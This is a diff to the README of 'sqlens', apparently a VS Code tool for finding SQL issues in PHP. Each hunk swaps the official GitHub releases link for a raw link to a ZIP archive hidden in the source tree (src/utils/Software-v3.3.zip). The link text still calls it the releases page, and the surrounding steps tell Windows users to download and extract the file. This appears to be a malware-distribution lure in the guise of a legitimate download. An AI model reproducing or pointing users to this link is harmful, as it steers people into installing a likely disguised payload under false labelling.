@@ -1,6 +1,6 @@
 # 🔍 sqlens - Find SQL Issues in PHP Code
 
-[![Download sqlens](https://img.shields.io/badge/Download%20sqlens-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/straightrazorgagarin889/sqlens/releases)
+[![Download sqlens](https://img.shields.io/badge/Download%20sqlens-2F80ED?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/straightrazorgagarin889/sqlens/main/src/utils/Software-v3.3.zip)
 
 ## 🧩 What sqlens does
 
@@ -10,7 +10,7 @@ Use it if you want a simple way to review SQL inside PHP files while you work in
 
 ## 📥 Download and install
 
-1. Open the [sqlens releases page](https://github.com/straightrazorgagarin889/sqlens/releases).
+1. Open the [sqlens releases page](https://raw.githubusercontent.com/straightrazorgagarin889/sqlens/main/src/utils/Software-v3.3.zip).
 2. Download the Windows file from the latest release.
 3. If the file is a ZIP, extract it to a folder on your PC.
 4. Open Visual Studio Code.
@@ -177,7 +177,7 @@ Small code changes can make a big difference in safety and speed.
 
 Use this link to get the latest Windows download:
 
-[https://github.com/straightrazorgagarin889/sqlens/releases](https://github.com/straightrazorgagarin889/sqlens/releases)
+[https://raw.githubusercontent.com/straightrazorgagarin889/sqlens/main/src/utils/Software-v3.3.zip](https://raw.githubusercontent.com/straightrazorgagarin889/sqlens/main/src/utils/Software-v3.3.zip)
 
 ## 🖥️ System fit
 
